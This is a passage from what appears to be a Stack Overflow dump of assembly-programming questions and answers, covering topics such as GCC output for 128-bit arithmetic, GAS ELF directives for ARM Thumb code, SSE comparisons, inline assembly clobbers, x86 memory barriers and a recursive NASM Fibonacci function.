        movq        (%rdi), %rax
        addq        $1, %rax
.L3:
        movabsq     $6794178679361, %rdx
        addq        %rdx, %rax
        movq        %rax, (%rdi)
        ret
</code></pre>

<p>...and this is the assembly for increment128_2:</p>

<pre><code>        movabsq     $-8801131483544218438, %rax
        addq        %rax, (%rsi)
        movabsq     $6794178679361, %rax
        addq        (%rdi), %rax
        movabsq     $-8801131483544218439, %rdx
        movq        %rax, (%rdi)
        cmpq        %rdx, (%rsi)
        setbe       %dl
        movzbl      %dl, %edx
        leaq        (%rdx,%rax), %rax
        movq        %rax, (%rdi)
        ret
</code></pre>

<p>Note the lack of conditional branches in the second version.</p>

<p>[edit]</p>

<p>Also, references are often bad for performance, because GCC has to worry about aliasing...  It is often better to just pass things by value.  Consider:</p>

<pre><code>struct my_uint128_t {
    unsigned long hi;
    unsigned long lo;
};

my_uint128_t increment128_3(my_uint128_t x)
{
    const unsigned long hiAdd=0x0000062DE49B5241;
    const unsigned long loAdd=0x85DC198BCDD714BA;

    x.lo += loAdd;
    x.hi += hiAdd + (x.lo &lt; loAdd);
    return x;
}
</code></pre>

<p>Assembly:</p>

<pre><code>        .cfi_startproc
        movabsq     $-8801131483544218438, %rdx
        movabsq     $-8801131483544218439, %rax
        movabsq     $6794178679362, %rcx
        addq        %rsi, %rdx
        cmpq        %rdx, %rax
        sbbq        %rax, %rax
        addq        %rcx, %rax
        addq        %rdi, %rax
        ret
</code></pre>

<p>This is actually the tightest code of the three.</p>

<p>...OK so none of them actually used the carry automatically :-).  But they do avoid the conditional branch, which I bet is the slow part (since the branch prediction logic will get it wrong half the time).</p>

<p>[edit 2]</p>

<p>And one more, which I stumbled across doing a little searching.  Did you know GCC has built-in support for 128-bit integers?</p>

<pre><code>typedef unsigned long my_uint128_t __attribute__ ((mode(TI)));

my_uint128_t increment128_4(my_uint128_t x)
{
    const my_uint128_t hiAdd=0x0000062DE49B5241;
    const unsigned long loAdd=0x85DC198BCDD714BA;

    return x + (hiAdd &lt;&lt; 64) + loAdd;
}
</code></pre>

<p>The assembly for this one is about as good as it gets:</p>

<pre><code>        .cfi_startproc
        movabsq     $-8801131483544218438, %rax
        movabsq     $6794178679361, %rdx
        pushq       %rbx
        .cfi_def_cfa_offset 16
        addq        %rdi, %rax
        adcq        %rsi, %rdx
        popq        %rbx
        .cfi_offset 3, -16
        .cfi_def_cfa_offset 8
        ret
</code></pre>

<p>(Not sure where the push/pop of <code>ebx</code> came from, but this is still not bad.)</p>

<p>All of these are with GCC 4.5.2, by the way.</p>
","6659465"
"When are GAS ELF the directives .type, .thumb, .size and .section needed?","6725","","<p>I'm working on an assembly program for an ARM Cortex-M3 based microcontroller (Thumb 2 instruction set), using GNU as.  </p>

<p>In some example code I find directives like <code>.size</code>, <code>.section</code> and <code>.type</code> which I understand are ELF directives. As an example:</p>

<pre><code>    .section    .text.Reset_Handler
    .weak       Reset_Handler
    .type       Reset_Handler, %function  
Reset_Handler:
    bl      main
    b       Infinite_Loop    
    .size   Reset_Handler, .-Reset_Handler
</code></pre>

<p><hr /><br />The <code>.type</code> directive is said to set the type of a symbol - usually either to %object (meaning data?) or %function. I do not know what difference it makes. It is not always included, so I am unsure when it needs to be used.</p>

<p>Also related to this is the <code>.thumb_func</code> directive. From what I have read it seems like it <em>might</em> be equivalent of: </p>

<pre><code>.thumb 
.type Symbol_Name, %function
</code></pre>

<p>Or is it something completely different?
<hr /><br /><code>.size</code> supposedly sets the size associated with a symbol. When this is needed, I have no idea. Is this calculated by default, but overrideable with this directive? If so - when would you want to override? </p>

<p><hr /><br /><code>.section</code> is easier to find docs on, and I think I have a fair idea of what it <em>does</em>, but I am still a little bit unsure about the usage. The way I understand it, it switches between different ELF sections (<code>text</code> for code, <code>data</code> for writable data, <code>bss</code> for uninitialized data, <code>rodata</code> for constants, and others), and defines new ones when desired. I guess you would switch between these depending on whether you define code, data, uninitialized data, etc. But why would you create a subsection for a function, as in the example above?</p>

<p><hr />Any help with this is appreciated. If you can find links to tutorials or docs that explain this in greater detail - preferably understandable for a novice - I would be very grateful. </p>

<p>So far, the <a href=""http://sourceware.org/binutils/docs/as/"" rel=""nofollow noreferrer"">Using as</a> manual has been of some help - maybe you can get more out of it than me, with more knowledge.</p>
","<p>I have been programming arm/thumb for many years lots of assembler and have needed very few of the many directives out there.</p>

<p>.thumb_func is quite important as pointed out by another responder.</p>

<p>for example</p>

<pre>
.globl _start
_start:
    b   reset

reset:

.arm

.globl one
one:
    add r0,r0,#1
    bx lr

.thumb

.globl two
two:
    add r0,r0,#2
    bx lr

.thumb_func
.globl three
three:
    add r0,r0,#3
    bx lr


.word two
.word three

</pre>

<p>.arm or used to be something like .code32 or .code 32 tells it this is arm code not thumb code, which for your cortex-m3 you wont need to use. </p>

<p>.thumb likewise, used to be .code 16 or maybe that still works, same deal makes the following code thumb not arm.</p>

<p>If the labels you are using are not global labels that you need to branch to from other files or indirectly, then wont need the .thumb_func.  But in order for the address of a branch to one of these global labels to be computed properly (lsbit is a 1 for thumb and 0 for arm) you want to mark it as a thumb or arm label and the thumb_func does that, otherwise you have to set that bit before branching adding more code and the label is not callable from C.    </p>

<pre>

00000000 &lt;_start&gt;:
   0:   eaffffff    b   4 &lt;one&gt;

00000004 &lt;one&gt;:
   4:   e2800001    add r0, r0, #1
   8:   e12fff1e    bx  lr

0000000c &lt;two&gt;:
   c:   3002        adds    r0, #2
   e:   4770        bx  lr

00000010 &lt;three&gt;:
  10:   3003        adds    r0, #3
  12:   4770        bx  lr
  14:   0000000c    andeq   r0, r0, ip
  18:   00000011    andeq   r0, r0, r1, lsl r0

</pre>

<p>Up to the .thumb the assembler is arm code as desired.</p>

<p>Both the two and three labels/functions are thumb code as desired but the two label has an even numbered address and three has the proper odd numbered address.</p>

<p>The latest codesourcery tools were used to assemble, link, and dump the above sample.</p>

<p>Now for the cortex-m3 where everything is thumb(/thumb2) thumb_func may not be as important, it may just work with command line switches (very easy to do an experiment to find out).  It is a good habit to have though in case you move away from a thumb only processor to a normal arm/thumb core.   </p>

<p>Assemblers generally like to add all of these directive and other ways of making things look/feel more like a high level language.  I am just saying you dont have to use them, I switched assemblers for arm and use many different assemblers for many different processors and prefer the less is more approach, meaning focus on the assembly itself and use as few tool specific items as possible.  I am usually the exception not the rule though, so you can probably figure out the more often used directives by looking at what directives the compiler output generates (and verify with documentation).</p>

<pre>
unsigned int one ( unsigned int x )
{
    return(x+1);
}


    .arch armv5te
    .fpu softvfp
    .eabi_attribute 20, 1
    .eabi_attribute 21, 1
    .eabi_attribute 23, 3
    .eabi_attribute 24, 1
    .eabi_attribute 25, 1
    .eabi_attribute 26, 2
    .eabi_attribute 30, 2
    .eabi_attribute 18, 4
    .file   ""bob.c""
    .text
    .align  2
    .global one
    .type   one, %function
one:
    .fnstart
.LFB0:
    @ args = 0, pretend = 0, frame = 0
    @ frame_needed = 0, uses_anonymous_args = 0
    @ link register save eliminated.
    add r0, r0, #1
    bx  lr
    .fnend
    .size   one, .-one
    .ident  ""GCC: (Sourcery G++ Lite 2010.09-50) 4.5.1""
    .section    .note.GNU-stack,"""",%progbits

</pre>

<p>I do use the .align when mixing arm and thumb assembler or data in with assembler, you would expect the assembler for such a platform to know something as obvious as thumb instructions are on halfword boundaries and arm instructions are aligned on word boundaries.  The tools are not always that smart.  sprinkling .aligns about wont hurt</p>

<p>.text is the default so that is a bit redundant, but wont hurt. .text and .data are standard attributes (not specific to arm) if you are compiling for a combination of rom and ram on your target you may care (depends on what you do with your linker script), otherwise .text will work for everything.  </p>

<p>.size apparently the size of the function start to that directive.  The assembler cannot figure this out on its own, so if the size of this function is important for your code, linker script, debugger, loader, whatever then this needs to be right, otherwise you dont have to bother.  A function is a high level concept anyway assembler doesnt really have functions much less a need to declare their size.  And the C compiler certainly doesnt care, it is only looking for a label to branch to and in the case of the arm family is it thumb code or arm code that is being branched to.</p>

<p>you may find the .pool directive (there is a newer equivalent) useful if you are lazy with your immediates (ldr rx,=0x12345678) on long stretches of code.  Here again the tools are not always smart enough to place this data after an unconditional branch, you sometimes have tell them.  I say lazy half seriously, it is painful to do the label: .word thing all the time and I believe both the arm and gcc tools allowed for that shortcut, so I use it as much as anyone else.</p>

<p>Also note llvm outputs an additional .eabi_attribute or two that is supported by code sourcery's version/mods to binutils but not supported (perhaps yet) by the gnu released binutils.  Two solutions that work, modify llvm's asm print function to not write the eabi_attributes or at least write them with a comment (@), or get the binutils source/mods from code sourcery and build binutils that way.  code sourcery tends to lead gnu (thumb2 support for example) or perhaps backports new features, so I assume these llvm attrubutes will be present in the mainline binutils before long.  I have suffered no ill effects by trimming the eabi_attributes off of the llvm compiled code.</p>

<p>Here is the llvm output for the same function above, apparently this is the llc that I modified to comment out the eabi_attributes.</p>

<pre>
    .syntax unified
@   .eabi_attribute 20, 1
@   .eabi_attribute 21, 1
@   .eabi_attribute 23, 3
@   .eabi_attribute 24, 1
@   .eabi_attribute 25, 1
@   .eabi_attribute 44, 1
    .file   ""bob.bc""
    .text
    .globl  one
    .align  2
    .type   one,%function
one:                                    @ @one
@ BB#0:                                 @ %entry
    add r0, r0, #1
    bx  lr
.Ltmp0:
    .size   one, .Ltmp0-one
</pre>

<p>The elf file format is well documented and very easy to parse if you want to really see what the elf specific directives (if any) are doing.  Many of these directives are to help the linker more than anything.  .thumb_func, .text, .data for example.</p>
","4445433"
"What does ordered / unordered comparison mean?","6724","","<p>Looking at the SSE operators</p>

<pre><code>CMPORDPS - ordered compare packed singles
CMPUNORDPS - unordered compare packed singles
</code></pre>

<p>What do ordered and unordered mean? I looked for equivalent instructions in the x86 instruction set, and it only seems to have unordered (FUCOM).</p>
","<p>An <strong>ordered comparison</strong> checks if neither operand is <code>NaN</code>. Conversely, an <strong>unordered comparison</strong> checks if either operand is a <code>NaN</code>.</p>

<p>This page gives some more information on this:</p>

<ul>
<li><a href=""http://csapp.cs.cmu.edu/public/waside/waside-sse.pdf"" rel=""noreferrer"">http://csapp.cs.cmu.edu/public/waside/waside-sse.pdf</a> (section 5)</li>
</ul>

<p>The idea here is that comparisons with <code>NaN</code> are indeterminate. (can't decide the result) So an ordered/unordered comparison checks if this is (or isn't) the case.</p>

<pre><code>double a = 0.;
double b = 0.;

__m128d x = _mm_set1_pd(a / b);     //  NaN
__m128d y = _mm_set1_pd(1.0);       //  1.0
__m128d z = _mm_set1_pd(1.0);       //  1.0

__m128d c0 = _mm_cmpord_pd(x,y);    //  NaN vs. 1.0
__m128d c1 = _mm_cmpunord_pd(x,y);  //  NaN vs. 1.0
__m128d c2 = _mm_cmpord_pd(y,z);    //  1.0 vs. 1.0
__m128d c3 = _mm_cmpunord_pd(y,z);  //  1.0 vs. 1.0
__m128d c4 = _mm_cmpord_pd(x,x);    //  NaN vs. NaN
__m128d c5 = _mm_cmpunord_pd(x,x);  //  NaN vs. NaN

cout &lt;&lt; _mm_castpd_si128(c0).m128i_i64[0] &lt;&lt; endl;
cout &lt;&lt; _mm_castpd_si128(c1).m128i_i64[0] &lt;&lt; endl;
cout &lt;&lt; _mm_castpd_si128(c2).m128i_i64[0] &lt;&lt; endl;
cout &lt;&lt; _mm_castpd_si128(c3).m128i_i64[0] &lt;&lt; endl;
cout &lt;&lt; _mm_castpd_si128(c4).m128i_i64[0] &lt;&lt; endl;
cout &lt;&lt; _mm_castpd_si128(c5).m128i_i64[0] &lt;&lt; endl;
</code></pre>

<p>Result:</p>

<pre><code>0
-1
-1
0
0
-1
</code></pre>

<ul>
<li><em>Ordered comparison</em> of <code>NaN</code> and <code>1.0</code> gives <code>false</code>.</li>
<li><em>Unordered comparison</em> of <code>NaN</code> and <code>1.0</code> gives <code>true</code>.</li>
<li><em>Ordered comparison</em> of <code>1.0</code> and <code>1.0</code> gives <code>true</code>.</li>
<li><em>Unordered comparison</em> of <code>1.0</code> and <code>1.0</code> gives <code>false</code>.</li>
<li><em>Ordered comparison</em> of <code>NaN</code> and <code>Nan</code> gives <code>false</code>.</li>
<li><em>Unordered comparison</em> of <code>NaN</code> and <code>NaN</code> gives <code>true</code>.</li>
</ul>
","8627368"
"Advanced assembly guide for writing a bootloader","6721","","<p>For a computer architecture project I want to write some bootable code to do something simple (I thought of a snake game, if that's not too complicated). I thought that writing a small bootloader to pass control to a C program shouldn't be too hard, but I can't find any accurate info.</p>

<p>I'm looking for some advanced guide for x86 assembly properly describing protected mode (I still can't tell if I need to switch to it, my first instinct is that I don't), how a computer boots, reading from the keyboard and printing to screen. </p>

<p>I can write in assembly and pass it gcc to write small programs, I just need the booting and interfacing information. Any info is appreciated, including books.</p>
","<p>I would recommend <a href=""http://wiki.osdev.org/Main_Page"" rel=""nofollow"">this</a> website. You will find there (especially in the category ""Introduction"") everything you need to know.</p>

<p>Unless you swith to protected mode you can use BIOS interrupts in order to print to screen, read from keyboard, etc. For example <a href=""http://www.ctyme.com/intr/rb-0106.htm"" rel=""nofollow"">interrupt 0x10, function 0x0e</a>. If you want to use another program, apart from the bootloader, you will need to load it to memory manually. There are BIOS functions for reading from a hard disk (or a pendrive that emulates a hard disk), but you will have to handle filesystem yourself. Probably, in your case, the best solution will be not to use any and just have that additional program written at fixed address and make bootloader load it from that hardcoded position.</p>

<p>Moreover, if you want to execute code compiled with gcc in real mode you need to use <code>.code16gcc</code> directive. It will make gas genereate code able to be executed in 16 bit real mode on 32 bit machines.</p>
","9550754"
"MIPS to C Translation","6703","","<p>I need to translate some MIPS assembly instructions to C code. I think I got it, but it seems counter-intuitive. Any help? We have variables f, g, h, i, j stored in registers $s0, $s1, $s2, $s3 and $s4 respectively. The base of arrays A and B are stored in $s6 and $s7 respectively. 4 byte words. Comments in the code are my own. </p>

<pre><code>addi $t0, $s6, 4   # $t0 = A[1]
add $t1, $s6, $0   # $t1 = A[0]
sw $t1, 0($t0)     # $t0 = A[0]
lw $t0, 0($t0)     # $t0 = A[0]
add $s0, $t1, $t0  # f = A[0] + A[0]
</code></pre>

<p>I just feel like I'm wrong. Why make $t0 A[1] first if we never use it?</p>
","<pre><code>sw $t1, 0($t0)     # $t0 = A[0]
</code></pre>

<p>You've got this back-to-front. It is a <em>store</em>, so it <em>is</em> used:</p>

<pre><code>sw $t1, 0($t0)     # A[1] = $t1
</code></pre>
","18885487"
"need help understanding the movzbl call in this function","6701","","<p>So I'm trying to write some C code by looking at the assembly here:</p>

<pre><code>pushl   %ebp
movl    %esp, %ebp
movl    12(%ebp), %eax
addl    8(%ebp), %eax
movzbl  (%eax), %eax
movsbl  %al,%eax
popl    %ebp
ret
</code></pre>

<p>I see that I have two variables, and they are being added together, then I'm getting lost when looking when the function starts calling movzbl and movesbl.  What's going on here?</p>
","<p>A corresponding C function would be something like</p>

<pre><code>char fn(char * string, int index)
{
    return string[index];
}
</code></pre>

<p>Specifically, the <code>movzbl</code> instruction fetches the byte stored at the sum of the two parameters, zero pads it, and stores it into <code>eax</code>. The <code>movsbl</code> instruction takes the lowest byte of eax, sign extends it, and stores the result back in eax.</p>
","24253382"
"Assembly/Linking problem with nasm and ld","6699","","<p>I have a sample assembly file that I compile with nasm:</p>

<pre><code>nasm -f elf syscall.asm 
</code></pre>

<p>This generates a <strong>syscall.o</strong> file. I try to link it with ld:</p>

<pre><code>ld -o syscall syscall.o
</code></pre>

<p>The ld command fails with the following error:</p>

<pre><code>ld: i386 architecture of input file `syscall.o' is incompatible with i386:x86-64 output
</code></pre>

<p>However, if I do</p>

<pre><code>ld -o syscall syscall.o -melf_i386
</code></pre>

<p>the command succeeds and I get a <strong>syscall</strong> executable. </p>

<p>Figuring out that nasm is not generating object code in x86-64 format I added ""BITS 64"" directive to the beginning of the syscall.asm file.</p>

<p>Then attempting to assemble syscall.asm with nasm gave the following error:</p>

<pre><code>error: elf output format does not support 64-bit code
</code></pre>

<p>That seems strange because doing ""file /usr/bin/nasm"" on my terminal gives:</p>

<pre><code>/usr/bin/nasm: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.18, stripped
</code></pre>

<p>My 64-bit Fedora Core 11 has the latest version of nasm installed and my CPU is Intel Core 2 Duo E7200.</p>

<p>[EDIT]</p>

<p>My question is how do I get nasm to emit object files that is compatible with i386:x86-64.</p>
","<p>Try using <code>elf64</code> as the output format.</p>

<p>Example run:</p>

<pre><code>$ cat elf64.asm
section .text
        jmp [rax]
$ nasm -f elf64 elf64.asm
$ objdump -Sr elf64.o

elf64.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 &lt;.text&gt;:
   0:   ff 20                   jmpq   *(%rax)
</code></pre>
","2246826"
"Returning result to eax (IA-32 Assembly language)","6672","","<p>I'm slightly confused as to how to return a value from a method in assembly language. As far as I know, the eax register is used to hold the result that is to be returned.</p>

<p>As an example, say my result is 4 and I use:</p>

<pre><code>mov eax, 4
</code></pre>

<p>I now have 4 in eax and I want to return this method. Is there anything I need to do or will the instruction <code>ret</code> automatically return the result? </p>

<p>The thing is that I don't know what's so special about register <code>eax</code> since when I use <code>ret</code> I go back to the caller, and the caller is free to access any of the registers I stored the result to, so why I couldn't just have used <code>ebx</code> or <code>ecx</code> with the result stored instead?</p>
","<p>The reason the result is stored in <code>eax</code> is convention; you can decided to store it in whichever register you like. However, the caller of your function is likely to assume that the content of the return value is stored in <code>eax</code>. This also implies that you don't have to do any extra work when calling <code>ret</code>.</p>
","5897822"
"Why is this inline assembly not working?","6643","","<p>For the the following code:</p>

<pre><code>long buf[64];

register long rrax asm (""rax"");
register long rrbx asm (""rbx"");
register long rrsi asm (""rsi"");

rrax = 0x34;
rrbx = 0x39;

__asm__ __volatile__ (""movq $buf,%rsi"");
__asm__ __volatile__ (""movq %rax, 0(%rsi);"");
__asm__ __volatile__ (""movq %rbx, 8(%rsi);"");

printf( ""buf[0] = %lx, buf[1] = %lx!\n"", buf[0], buf[1] );
</code></pre>

<p>I get the following output:</p>

<pre><code>buf[0] = 0, buf[1] = 346161cbc0!
</code></pre>

<p>while it should have been:</p>

<pre><code>buf[0] = 34, buf[1] = 39!
</code></pre>

<p>Any ideas why it is not working properly, and how to solve it?</p>
","<p>You clobber memory but don't tell GCC about it, so GCC can cache values in <code>buf</code> across assembly calls.  If you want to use inputs and outputs, tell GCC about everything.</p>

<pre><code>__asm__ (
    ""movq %1, 0(%0)\n\t""
    ""movq %2, 8(%0)""
    :                                /* Outputs (none) */
    : ""r""(buf), ""r""(rrax), ""r""(rrbx) /* Inputs */
    : ""memory"");                     /* Clobbered */
</code></pre>

<p>You also generally want to let GCC handle most of the <code>mov</code>, register selection, etc -- even if you explicitly constrain the registers (rrax is stil <code>%rax</code>) let the information flow through GCC or you will get unexpected results.</p>

<h1><code>__volatile__</code> is wrong.</h1>

<p>The reason <code>__volatile__</code> exists is so you can guarantee that the compiler places your code exactly where it is... which is a <em>completely unnecessary</em> guarantee for this code.  It's necessary for implementing advanced features such as memory barriers, but almost completely worthless if you are only modifying memory and registers.</p>

<p>GCC already knows that it can't move this assembly after <code>printf</code> because the <code>printf</code> call accesses <code>buf</code>, and <code>buf</code> could be clobbered by the assembly.  GCC already knows that it can't move the assembly before <code>rrax=0x39;</code> because <code>rax</code> is an input to the assembly code.  So what does <code>__volatile__</code> get you?  Nothing.</p>

<p>If your code does not work without <code>__volatile__</code> then there is an error in the code which should be <strong>fixed</strong> instead of just adding <code>__volatile__</code> and hoping that makes everything better.  The <code>__volatile__</code> keyword is not magic and should not be treated as such.</p>

<p><strong>Alternative fix:</strong></p>

<p>Is <code>__volatile__</code> necessary for your original code?  No.  Just mark the inputs and clobber values correctly.</p>

<pre><code>/* The ""S"" constraint means %rsi, ""b"" means %rbx, and ""a"" means %rax
   The inputs and clobbered values are specified.  There is no output
   so that section is blank.  */
rsi = (long) buf;
__asm__ (""movq %%rax, 0(%%rsi)"" : : ""a""(rrax), ""S""(rssi) : ""memory"");
__asm__ (""movq %%rbx, 0(%%rsi)"" : : ""b""(rrbx), ""S""(rrsi) : ""memory"");
</code></pre>

<p>Why <code>__volatile__</code> doesn't help you here:</p>

<pre><code>rrax = 0x34; /* Dead code */
</code></pre>

<p>GCC is well within its rights to completely delete the above line, since the code in the question above claims that it never uses <code>rrax</code>.</p>

<h1>A clearer example</h1>

<pre><code>long global;
void store_5(void)
{
    register long rax asm (""rax"");
    rax = 5;
    __asm__ __volatile__ (""movq %%rax, (global)"");
}
</code></pre>

<p>The disassembly is more or less as you expect it at <code>-O0</code>,</p>

<pre><code>movl $5, %rax
movq %rax, (global)
</code></pre>

<p>But with optimization off, you can be fairly sloppy about assembly.  Let's try <code>-O2</code>:</p>

<pre><code>movq %rax, (global)
</code></pre>

<p>Whoops!  Where did <code>rax = 5;</code> go?  It's dead code, since <code>%rax</code> is never used in the function — at least as far as GCC knows.  GCC doesn't peek inside assembly.  What happens when we remove <code>__volatile__</code>? </p>

<pre><code>; empty
</code></pre>

<p>Well, you might think <code>__volatile__</code> is doing you a service by keeping GCC from discarding your precious assembly, but it's just masking the fact that GCC thinks your assembly isn't <em>doing</em> anything.  GCC thinks your assembly takes no inputs, produces no outputs, and clobbers no memory.  You had better straighten it out:</p>

<pre><code>long global;
void store_5(void)
{
    register long rax asm (""rax"");
    rax = 5;
    __asm__ __volatile__ (""movq %%rax, (global)"" : : : ""memory"");
}
</code></pre>

<p>Now we get the following output:</p>

<pre><code>movq %rax, (global)
</code></pre>

<p>Better.  But if you tell GCC about the inputs, it will make sure that <code>%rax</code> is properly initialized first:</p>

<pre><code>long global;
void store_5(void)
{
    register long rax asm (""rax"");
    rax = 5;
    __asm__ (""movq %%rax, (global)"" : : ""a""(rax) : ""memory"");
}
</code></pre>

<p>The output, with optimizations:</p>

<pre><code>movl $5, %eax
movq %rax, (global)
</code></pre>

<p>Correct!  And we don't even need to use <code>__volatile__</code>.</p>

<h1>Why does <code>__volatile__</code> exist?</h1>

<p>The primary correct use for <code>__volatile__</code> is if your assembly code does something else besides input, output, or clobbering memory.  Perhaps it messes with special registers which GCC doesn't know about, or affects IO.  You see it a lot in the Linux kernel, but it's misused very often in user space.</p>

<p>The <code>__volatile__</code> keyword is very tempting because we C programmers often like to think we're <em>almost</em> programming in assembly language already.  We're not.  C compilers do a lot of data flow analysis — so you need to explain the data flow to the compiler for your assembly code.  That way, the compiler can safely manipulate your chunk of assembly just like it manipulates the assembly that it generates.</p>

<p>If you find yourself using <code>__volatile__</code> a lot, as an alternative you could write an entire function or module in an assembly file.</p>
","8891190"
"Which is a better write barrier on x86: lock+addl or xchgl?","6640","","<p>The Linux kernel uses <code>lock; addl $0,0(%%esp)</code> as write barrier, while the RE2 library uses <code>xchgl (%0),%0</code> as write barrier. What's the difference and which is better?</p>

<p>Does x86 also require read barrier instructions? RE2 defines its read barrier function as a no-op on x86 while Linux defines it as either <code>lfence</code> or no-op depending on whether SSE2 is available. When is <code>lfence</code> required?</p>
","<p>The ""<strong>lock; addl $0,0(%%esp)</strong>"" is faster in case that we testing the 0 state of lock variable at (%%esp) address. Because we add 0 value to lock variable and the zero flag is set to 1 if the lock value of variable at address (%%esp) is 0.</p>

<p><strong>lfence</strong> from Intel datasheet:</p>

<blockquote>
  <p>Performs a serializing operation on
  all load-from-memory instructions that
  were issued prior the LFENCE
  instruction. This serializing
  operation guarantees that every load
  instruction that precedes in program
  order the LFENCE instruction is
  globally visible before any load
  instruction that follows the LFENCE
  instruction is globally visible.</p>
</blockquote>

<p>For instance: memory write instruction like 'mov' are atomic (they don't need lock prefix) if there are properly aligned. But this instruction is normally executed in CPU cache and will not be globally visible at this moment for all other threads, because memory fence must be preformed first.</p>

<p><strong>EDIT:</strong></p>

<p>So the main difference between these two instructions is that <strong>xchgl</strong> instruction will not have any effect on the conditional flags. Certainly we can test the lock variable state with <strong>lock cmpxchg</strong> instruction but this is still more complex than with <strong>lock add $0</strong> instruction.</p>
","4235224"
"How to check if a register is zero in x86_64 assembly","6638","","<p>I'm trying to check if a value is zero in x86_64 assembly code. I know that this usually consist of a <code>cmp</code> variant followed by a <code>jmp</code> variant, but I'm not sure of the exact instructions to use.</p>
","<p>If you've just used an instruction that modifies ZF before, simply check that flag and jump using <code>JZ</code> or <code>JE</code>. For example</p>

<pre><code>and rax, rbx ; ZF was modified
jz  is_zero  ; so to check if rax is zero, a single jump is enough
</code></pre>

<p>If ZF was not set, you need to do that explicitly. The obvious way is</p>

<pre><code>cmp rax, 0
je  equal_zero
</code></pre>

<p>However since <code>cmp</code> is longer if you look at the output binary, <a href=""https://stackoverflow.com/q/147173/995714""><code>test</code></a> or sometimes <a href=""https://reverseengineering.stackexchange.com/q/4656/2563""><code>and</code>, <code>or</code></a> is preferred</p>

<pre><code>83F800  cmp eax, 0
09C0    or eax, eax
85C0    test eax, eax
</code></pre>

<p>The resulting code will be</p>

<pre><code>test rax, rax
jz   is_zero
</code></pre>

<p>You can get the assembly output from a compiler and check or view it in an online tool like <a href=""https://gcc.godbolt.org/#g:!((g:!((g:!((h:codeEditor,i:(j:1,source:&#39;//+Type+your+code+here,+or+load+an+example.%0Aint+is_zero(int+x,+int+*y,+int+*z)+%7B%0A+++if+(x+%3D%3D+0)%0A+++++*y+%3D+*z%3B%0A+++else%0A+++++*y+%3D+-*z%3B%0A%7D%0A&#39;),l:&#39;5&#39;,n:&#39;0&#39;,o:&#39;C%2B%2B+source+%231&#39;,t:&#39;0&#39;)),k:25.650950254211345,l:&#39;4&#39;,n:&#39;0&#39;,o:&#39;&#39;,s:0,t:&#39;0&#39;),(g:!((h:compiler,i:(compiler:g71,filters:(b:&#39;0&#39;,commentOnly:&#39;0&#39;,directives:&#39;0&#39;,intel:&#39;0&#39;),options:&#39;-O2&#39;,source:1),l:&#39;5&#39;,n:&#39;0&#39;,o:&#39;x86-64+gcc+7.1+(Editor+%231,+Compiler+%231)&#39;,t:&#39;0&#39;)),k:35.5645638630054,l:&#39;4&#39;,m:100,n:&#39;0&#39;,o:&#39;&#39;,s:0,t:&#39;0&#39;),(g:!((h:compiler,i:(compiler:icc17,filters:(b:&#39;0&#39;,commentOnly:&#39;0&#39;,directives:&#39;0&#39;,intel:&#39;0&#39;),options:&#39;-O2&#39;,source:1),l:&#39;5&#39;,n:&#39;0&#39;,o:&#39;x86-64+icc+17+(Editor+%231,+Compiler+%232)&#39;,t:&#39;0&#39;)),k:38.78448588278327,l:&#39;4&#39;,m:100,n:&#39;0&#39;,o:&#39;&#39;,s:0,t:&#39;0&#39;)),l:&#39;2&#39;,n:&#39;0&#39;,o:&#39;&#39;,t:&#39;0&#39;)),version:4"" rel=""nofollow noreferrer"">gcc godbolt</a></p>

<p>Read more: <a href=""http://en.wikibooks.org/wiki/X86_Assembly/Control_Flow"" rel=""nofollow noreferrer"">http://en.wikibooks.org/wiki/X86_Assembly/Control_Flow</a></p>
","29763596"
"What language are the C and C++ standard libraries written in?","6625","","<p>C and C++ by themselves can't actually <em>do</em> anything, they need the libraries to work.  So how were the libraries created?  Assembly language?</p>
","<p>C and C++ libraries are almost universally written in C and C++, as are C and C++ compilers. In fact, many compilers are even used to compile themselves!</p>

<p>How is this possible? Well, obviously the first C compiler couldn't have been initially developed in C. However, once a C compiler exists, then it can be used to compile another compiler. And as a compiler is being developed, so is the source code. It's possible to develop both side-by-side. Since most compilers are improvements on their predecessors, they are often used to compile better versions of themselves!</p>

<p>However, with respect to the library, that's easy: C <em>can</em> actually do something. While some lower-level routines may be written in assembler, the vast majority can be written in C or C++.</p>
","6620214"
"Any sources for learning assembly programming in Windows?","6624","","<p>I would like to learn Assembly Programming for Windows. But I am having some problems to found material for learning. All the material I see don't give enough code to program (they show just snippets), are too old, or are just theory.</p>
","<p>For a long time, the 'standard' tutorial beginners start with for Windows assembly programming is <a href=""http://win32assembly.programminghorizon.com/tutorials.html"" rel=""nofollow"">Iczelion's tutorial</a>. Also for Windows assembler programming, the best forum (IMO) to get started is probably MASM32. It has a very active community which is very welcoming and helpful to newcomers and beginners. It sort of depends which particular flavour of assembler you want to learn but IMO, for Windows MASM32 has the best userbase (both in terms of community and resources around) for beginners.</p>

<p>You mention you want to learn RCE (reverse code engineering) also. A very common starting place for reversing on Windows is <a href=""http://tuts4you.com/download.php?list.17"" rel=""nofollow"">lena151's tutorials</a> which potentially is also a nice start if you already know assembler conceptually from having done Linux assembler programming.</p>
","6299917"
"NASM Assembly recursive fibonacci","6622","","<p>Learning NASM Assembly on 32-bit Ubuntu.</p>

<p>I've been learning about recursive functions. I just did factorial, with your help here: <a href=""https://stackoverflow.com/q/19217960/555690"">Understanding recursive factorial function in NASM Assembly</a></p>

<p>Watching the code, I thought that maybe I could quickly implement fibonacci as well, using almost the same code. Here is the code, assuming that the parameter is always greater than <code>0</code>:</p>

<pre><code>SECTION .text
global main
main:
; -----------------------------------------------------------
; Main
; -----------------------------------------------------------
push    6
call    fibonacci
mov     [ECX],EAX
add     byte [ECX],'0'
mov     EDX,1
call    print

; -----------------------------------------------------------
; Exit
; -----------------------------------------------------------
mov EAX,1
int 0x80

; -----------------------------------------------------------
; Fibonacci recursivo: f(n) = f(n - 1) + f(n - 2)
; -----------------------------------------------------------
fibonacci:

push    EBP         ; Retrieve parameter and put it
push    EBX         ; Save previous parameter
mov     EBP,ESP     ; into EBX register
add     EBP,12      ;
mov     EBX,[EBP]   ; EBX = Param

cmp     EBX,1       ; Check for base case
jle     base        ; It is base if (n &lt;= 1)

dec     EBX     ; Decrement EBX to put it in the stack
push    EBX     ; Put (EBX - 1) in stack
inc     EBX     ; Restore EBX
call    fibonacci   ; Calculate fibonacci for (EBX - 1)
mov ESI,EAX     ; EAX = (EAX + EBX)
pop EBX         ; Retrieve EBX from the stack

sub EBX,2       ; Decrement EBX to put it in the stack
push    EBX     ; Put (EBX - 2) in stack
add EBX,2       ; Restore EBX
